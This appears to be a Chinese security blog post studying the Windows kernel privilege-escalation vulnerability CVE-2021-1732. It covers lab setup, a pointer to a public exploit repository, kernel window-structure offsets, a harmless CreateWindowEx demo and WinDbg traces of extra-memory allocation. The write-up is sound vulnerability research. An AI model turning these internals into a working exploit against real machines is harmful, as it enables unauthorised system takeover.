<!DOCTYPE html><html lang="zh-CH" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CVE-2021-1732 window内核提取漏洞 | The_Itach1</title><meta name="keywords" content="Windows,cve"><meta name="author" content="The_Itach1"><meta name="copyright" content="The_Itach1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="CVE-2021-1732 window内核提取漏洞继续Windows提取洞的学习，这个漏洞利用的过程比上一个复杂挺多，之前又遭了甲流，花的时间久了点。下一个提权洞准备搞个UAF的。 环境搭建漏洞复现环境。  vmware 16 Windows 10 Version 1909 windbg，VirtualKD-Redux  去 MSDN 工具站下载对应的镜像，然后安装。 然后安装虚拟机，搭建Vir">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2021-1732 window内核提取漏洞">
<meta property="og:url" content="http://example.com/2023/04/10/CVE-2021-1732%20Windows%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="The_Itach1">
<meta property="og:description" content="CVE-2021-1732 window内核提取漏洞继续Windows提取洞的学习，这个漏洞利用的过程比上一个复杂挺多，之前又遭了甲流，花的时间久了点。下一个提权洞准备搞个UAF的。 环境搭建漏洞复现环境。  vmware 16 Windows 10 Version 1909 windbg，VirtualKD-Redux  去 MSDN 工具站下载对应的镜像，然后安装。 然后安装虚拟机，搭建Vir">
<meta property="og:locale" content="zh_CH">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2023-04-10T10:38:45.000Z">
<meta property="article:modified_time" content="2023-04-10T14:51:31.486Z">
<meta property="article:author" content="The_Itach1">
<meta property="article:tag" content="Windows">
<meta property="article:tag" content="cve">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/2.png"><link rel="canonical" href="http://example.com/2023/04/10/CVE-2021-1732%20Windows%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  ClickShowText: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-04-10 22:51:31'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
   if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }
  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }const asideStatus = saveToLocal.get('aside-status')
if (asideStatus !== undefined) {
   if (asideStatus === 'hide') {
     document.documentElement.classList.add('hide-aside')
   } else {
     document.documentElement.classList.remove('hide-aside')
   }
}})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/5.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">68</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">27</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> music</span></a></li><li><a class="site-page" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> Gallery</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> movies</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">The_Itach1</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> music</span></a></li><li><a class="site-page" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> Gallery</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> movies</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">CVE-2021-1732 window内核提取漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-04-10T10:38:45.000Z" title="Created 2023-04-10 18:38:45">2023-04-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-04-10T14:51:31.486Z" title="Updated 2023-04-10 22:51:31">2023-04-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Reverse/">Reverse</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="CVE-2021-1732-window内核提取漏洞"><a href="#CVE-2021-1732-window内核提取漏洞" class="headerlink" title="CVE-2021-1732 window内核提取漏洞"></a>CVE-2021-1732 window内核提取漏洞</h1><p>继续Windows提取洞的学习，这个漏洞利用的过程比上一个复杂挺多，之前又遭了甲流，花的时间久了点。下一个提权洞准备搞个UAF的。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>漏洞复现环境。</p>
<ul>
<li>vmware 16</li>
<li>Windows 10 Version 1909</li>
<li>windbg，VirtualKD-Redux</li>
</ul>
<p>去 <a target="_blank" rel="noopener" href="https://msdn.itellyou.cn/">MSDN 工具站</a>下载对应的镜像，然后安装。<br><img src="https://s2.loli.net/2023/04/10/1ETyNJfPXlMKZ82.png" alt="1.png"></p>
<p>然后安装虚拟机，搭建VirtualKD-Redux调试环境。</p>
<p>编译exp，这里使用的是<a target="_blank" rel="noopener" href="https://github.com/KaLendsi/CVE-2021-1732-Exploit">KaLendsi/CVE-2021-1732-Exploit</a>，修改下属性，应该就可以编译了。</p>
<p>测试一下，提权成功。<br><img src="https://s2.loli.net/2023/04/10/QAnpHjI1TW65SqJ.png" alt="2.png"></p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>单看漏洞点，实际上可以说是一个内存越界读写，而且与Windows窗口扩展内存有巨大关系。</p>
<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="tagWND"><a href="#tagWND" class="headerlink" title="tagWND"></a>tagWND</h4><p>tagWND结构体，参考别人总结好的，比较重要的是ptagWND -&gt; ptagWNDk -&gt; dwExtraFlag还有ptagWND -&gt; ptagWNDk -&gt; pExtraByte，还有其他的，这些实际上都是调试内核函数总结出来的，对理解这个漏洞非常重要。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">ptagWND(user layer)</span><br><span class="line">	0x00 hwnd</span><br><span class="line">    0x10 unknown</span><br><span class="line">        0x00 pTEB</span><br><span class="line">            0x220 pEPROCESS(of current process)</span><br><span class="line">    0x18 unknown</span><br><span class="line">        0x80 kernel desktop heap base</span><br><span class="line">    0x20 pself</span><br><span class="line">    0x28 ptagWNDk(kernel layer)</span><br><span class="line">        0x00 hwnd</span><br><span class="line">        0x08 kernel desktop heap base offset</span><br><span class="line">        0x18 dwStyle</span><br><span class="line">        0x58 Window Rect left</span><br><span class="line">        0x5C Window Rect top</span><br><span class="line">        0x98 spMenu(uninitialized)</span><br><span class="line">        0xC8 cbWndExtra</span><br><span class="line">        0xE8 dwExtraFlag</span><br><span class="line">        0x128 pExtraBytes</span><br><span class="line">    0x30 kernel desktop heap base offset</span><br><span class="line">    0x90 spMenu(analyzed by myself)</span><br><span class="line">        0x00 hMenu</span><br><span class="line">        0x18 unknown0</span><br><span class="line">            0x100 unknown</span><br><span class="line">                0x00 pEPROCESS(of current process)</span><br><span class="line">        0x28 unknown1</span><br><span class="line">            0x2C cItems(for check)</span><br><span class="line">        0x40 unknown2(for check)</span><br><span class="line">        0x44 unknown3(for check)</span><br><span class="line">        0x50 ptagWND</span><br><span class="line">        0x58 rgItems</span><br><span class="line">            0x00 unknown(for exploit)</span><br><span class="line">        0x98 spMenuk</span><br><span class="line">            0x00 pSelf</span><br></pre></td></tr></table></figure>

<p>另一种表达方式</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>: kd&gt; dt tagWND</span><br><span class="line">   +<span class="number">0x000</span> h               : Ptr64 Void</span><br><span class="line">   +<span class="number">0x008</span> DesktopOffset   : Uint8B</span><br><span class="line">   +<span class="number">0x010</span> pti             : Ptr64 tagTHREADINFO</span><br><span class="line">   +<span class="number">0x018</span> rpdesk          : Ptr64 tagDESKTOP</span><br><span class="line">   +<span class="number">0x020</span> pSelf           : Ptr64 tagWND</span><br><span class="line">   +<span class="number">0x028</span> ptagWNDK        : Ptr64 tagWNDK</span><br><span class="line">   +<span class="number">0x030</span> DesktopOffset   : Uint8B</span><br><span class="line">   +<span class="number">0x058</span> Left            : Uint4B</span><br><span class="line">   +<span class="number">0x05C</span> Right           : Uint4B       </span><br><span class="line">   +<span class="number">0x098</span> spMenu          : Ptr64 tagMENU</span><br><span class="line">   +<span class="number">0x0C8</span> cbwndExtra      : UInt4B</span><br><span class="line">   +<span class="number">0x0E8</span> Flags           : UInt4B</span><br><span class="line">   +<span class="number">0x128</span> pExtraBytes     : Uint8B</span><br></pre></td></tr></table></figure>

<p>tagWNDK结构体</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">struct tagWNDK</span><br><span class="line">&#123;</span><br><span class="line">    ULONG64 hWnd;               &#x2F;&#x2F;+0x00</span><br><span class="line">    ULONG64 OffsetToDesktopHeap;&#x2F;&#x2F;+0x08 tagWNDK相对桌面堆基址偏移</span><br><span class="line">    ULONG64 state;              &#x2F;&#x2F;+0x10</span><br><span class="line">    DWORD dwExStyle;            &#x2F;&#x2F;+0x18</span><br><span class="line">    DWORD dwStyle;              &#x2F;&#x2F;+0x1C</span><br><span class="line">    BYTE gap[0x38];</span><br><span class="line">    DWORD rectBar_Left;         &#x2F;&#x2F;0x58</span><br><span class="line">    DWORD rectBar_Top;          &#x2F;&#x2F;0x5C</span><br><span class="line">    BYTE gap1[0x68];</span><br><span class="line">    ULONG64 cbWndExtra;         &#x2F;&#x2F;+0xC8 窗口扩展内存的大小</span><br><span class="line">    BYTE gap2[0x18];</span><br><span class="line">    DWORD dwExtraFlag;          &#x2F;&#x2F;+0xE8  决定SetWindowLong寻址模式</span><br><span class="line">    BYTE gap3[0x10];            &#x2F;&#x2F;+0xEC</span><br><span class="line">    DWORD cbWndServerExtra;     &#x2F;&#x2F;+0xFC</span><br><span class="line">    BYTE gap5[0x28];</span><br><span class="line">    ULONG64 pExtraBytes;    &#x2F;&#x2F;+0x128 模式1：内核偏移量 模式2：用户态指针</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>





<h4 id="CreateWindowsEx调试"><a href="#CreateWindowsEx调试" class="headerlink" title="CreateWindowsEx调试"></a>CreateWindowsEx调试</h4><p>我们需要对内核层的CreateWindowsEx进行调试来查看，首先编写一个demo，其调用CreateWindowsEx，并设置额外扩展内存，主要调试这额外扩展内存是怎么来的，以及赋值到哪。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 窗口类的窗口过程函数(负责消息处理) */</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">MyWndProc</span><span class="params">(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> DefWindowProc(hWnd, message, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 程序入口点 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">(_In_ HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="function"><span class="params">    _In_opt_ HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="function"><span class="params">    _In_ LPSTR     lpCmdLine,</span></span></span><br><span class="line"><span class="function"><span class="params">    _In_ <span class="keyword">int</span>       nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HWND hwnd;</span><br><span class="line">    MSG msg;</span><br><span class="line">    WNDCLASSEX wndclass = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    wndclass.cbSize = <span class="keyword">sizeof</span>(WNDCLASSEX);</span><br><span class="line">    wndclass.style = CS_HREDRAW | CS_VREDRAW;</span><br><span class="line">    wndclass.lpfnWndProc = MyWndProc;</span><br><span class="line">    wndclass.hInstance = hInstance;</span><br><span class="line">    wndclass.lpszClassName = (LPWSTR)<span class="string">L&quot;Itach1&quot;</span>;</span><br><span class="line">    <span class="comment">/* 使用 cbWndExtra 字段，设置扩展内存大小为两个 long long */</span></span><br><span class="line">    wndclass.cbWndExtra = <span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span>);</span><br><span class="line"></span><br><span class="line">    RegisterClassEx(&amp;wndclass);</span><br><span class="line"></span><br><span class="line">    hwnd = CreateWindowEx(</span><br><span class="line">        <span class="literal">NULL</span>, <span class="string">L&quot;Itach1&quot;</span>, <span class="string">L&quot;Itach1&quot;</span>,</span><br><span class="line">        WS_OVERLAPPEDWINDOW | WS_VISIBLE,</span><br><span class="line">        CW_USEDEFAULT, CW_USEDEFAULT,</span><br><span class="line">        CW_USEDEFAULT, CW_USEDEFAULT,</span><br><span class="line">        <span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (GetMessage(&amp;msg, hwnd, <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        TranslateMessage(&amp;msg);</span><br><span class="line">        DispatchMessage(&amp;msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> msg.wParam;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其底层调用的是win32kfull!xxxCreateWindowEx函数，用windbg下断点，调试。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; ba e1 win32kfull!xxxCreateWindowEx</span><br><span class="line">0: kd&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">win32kfull!xxxCreateWindowEx:</span><br><span class="line">fffff285`8283bbb0 4053            push    rbx</span><br><span class="line">0: kd&gt; kb</span><br><span class="line"> <span class="comment"># RetAddr           : Args to Child                                                           : Call Site</span></span><br><span class="line">00 fffff285`8283b690 : 00000000`00000000 00000000`00000000 00000000`00000000 ffffb985`70a68aa8 : win32kfull!xxxCreateWindowEx</span><br><span class="line">01 fffff800`47a8ab15 : ffffd204`9715d080 ffffb985`70a68990 ffffb985`70a689a8 ffffb985`70a689b8 : win32kfull!NtUserCreateWindowEx+0x6a0</span><br><span class="line">02 00007ffe`eea71f24 : 00007ffe`f0278011 ffffffff`ffff0000 00000000`40000600 00000000`0014fcc8 : nt!KiSystemServiceCopyEnd+0x25</span><br><span class="line">03 00007ffe`f0278011 : ffffffff`ffff0000 00000000`40000600 00000000`0014fcc8 00000000`0014f920 : win32u!NtUserCreateWindowEx+0x14</span><br><span class="line">04 00007ffe`f0277c04 : 00000000`00000006 00000000`00000000 00000000`00000000 00000000`10cf0000 : USER32!VerNtUserCreateWindowEx+0x211</span><br><span class="line">05 00007ffe`f0277a42 : 0000fa4c`80000000 00000000`0000000a 00000000`00000000 00000000`0014fea0 : USER32!CreateWindowInternal+0x1b4</span><br><span class="line">*** WARNING: Unable to verify checksum <span class="keyword">for</span> test.exe</span><br><span class="line">06 00000001`40001134 : 00000000`004732c0 00007ffe`eecdc105 00000000`00000002 00007ffe`ef601edb : USER32!CreateWindowExW+0x82</span><br><span class="line">07 00000000`004732c0 : 00007ffe`eecdc105 00000000`00000002 00007ffe`ef601edb 00000000`80000000 : <span class="built_in">test</span>+0x1134</span><br><span class="line">08 00007ffe`eecdc105 : 00000000`00000002 00007ffe`ef601edb 00000000`80000000 00007ffe`80000000 : 0x4732c0</span><br><span class="line">09 00000000`00000000 : 00000001`40000000 00000000`00000000 0000f271`9730b898 00000001`40001b12 : ucrtbase!parse_command_line&lt;char&gt;+0x71</span><br></pre></td></tr></table></figure>

<p>在538行调用win32kbase!HMAllocObject申请tagWND结构体内存，这里怎么看出来申请tagWND的，应该是通过ida反编译后的代码可以看出来吧，并且会初始化ptagWND -&gt; ptagWNDk -&gt; pExtraBytes为0,反编译有点问题。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fffff285`8283c347 41b950010000    mov     r9d,150h</span><br><span class="line">fffff285`8283c34d 448ac6          mov     r8b,sil</span><br><span class="line">fffff285`8283c350 488b942480010000 mov     rdx,qword ptr [rsp+180h]</span><br><span class="line">fffff285`8283c358 498bcf          mov     rcx,r15</span><br><span class="line">fffff285`8283c35b 48ff1546983100  call    qword ptr [win32kfull!_imp_HMAllocObject (fffff285`82b55ba8)] ds:002b:fffff285`82b55ba8=&#123;win32kbase!HMAllocObject (fffff285`82bccd40)&#125;</span><br><span class="line">fffff285`8283c362 0f1f440000      nop     dword ptr [rax+rax]</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/04/10/4cV3CXMLWZqOyxj.png" alt="3.png"></p>
<p>继续向下调试，可以发现一个判断，判断cbWndExtra成员是否为0，调试完查看值，不为0。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; pc</span><br><span class="line">win32kfull!xxxCreateWindowEx+0x1241:</span><br><span class="line">fffff285`8283cdf1 e8d2b90d00      call    win32kfull!tagWND::RedirectedFieldcbwndExtra&lt;int&gt;::operator!= (fffff285`829187c8)</span><br><span class="line">1: kd&gt; p</span><br><span class="line">win32kfull!xxxCreateWindowEx+0x1246:</span><br><span class="line">fffff285`8283cdf6 84c0            <span class="built_in">test</span>    al,al</span><br><span class="line">1: kd&gt; r al</span><br><span class="line">al=1</span><br></pre></td></tr></table></figure>

<p>就会进入xxxClientAllocWindowClassExtraBytes函数，申请空间，然后返回给ptagWND -&gt; ptagWNDk -&gt; pExtraBytes。<br>传入的大小为0x10，正好对应我们代码中，申请的两个long long大小。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">fffff285`8283cdca 8981c8000000    mov     dword ptr [rcx+0C8h],eax</span><br><span class="line">fffff285`8283cdd0 498b4728        mov     rax,qword ptr [r15+28h]</span><br><span class="line">fffff285`8283cdd4 8380c800000020  add     dword ptr [rax+0C8h],20h</span><br><span class="line">fffff285`8283cddb 89bc24f0000000  mov     dword ptr [rsp+0F0h],edi</span><br><span class="line">fffff285`8283cde2 498d8fb1000000  lea     rcx,[r15+0B1h]</span><br><span class="line">fffff285`8283cde9 488d9424f0000000 lea     rdx,[rsp+0F0h]</span><br><span class="line">fffff285`8283cdf1 e8d2b90d00      call    win32kfull!tagWND::RedirectedFieldcbwndExtra&lt;int&gt;::operator!= (fffff285`829187c8)</span><br><span class="line">fffff285`8283cdf6 84c0            <span class="built_in">test</span>    al,al</span><br><span class="line">fffff285`8283cdf8 744a            je      win32kfull!xxxCreateWindowEx+0x1294 (fffff285`8283ce44)</span><br><span class="line">fffff285`8283cdfa 498b4728        mov     rax,qword ptr [r15+28h]</span><br><span class="line">fffff285`8283cdfe 8b88c8000000    mov     ecx,dword ptr [rax+0C8h]</span><br><span class="line">fffff285`8283ce04 e8a3470100      call    win32kfull!xxxClientAllocWindowClassExtraBytes (fffff285`828515ac)</span><br><span class="line"></span><br><span class="line">1: kd&gt; p</span><br><span class="line">win32kfull!xxxCreateWindowEx+0x1254:</span><br><span class="line">fffff285`8283ce04 e8a3470100      call    win32kfull!xxxClientAllocWindowClassExtraBytes (fffff285`828515ac)</span><br><span class="line">1: kd&gt; r ecx</span><br><span class="line">ecx=10</span><br></pre></td></tr></table></figure>

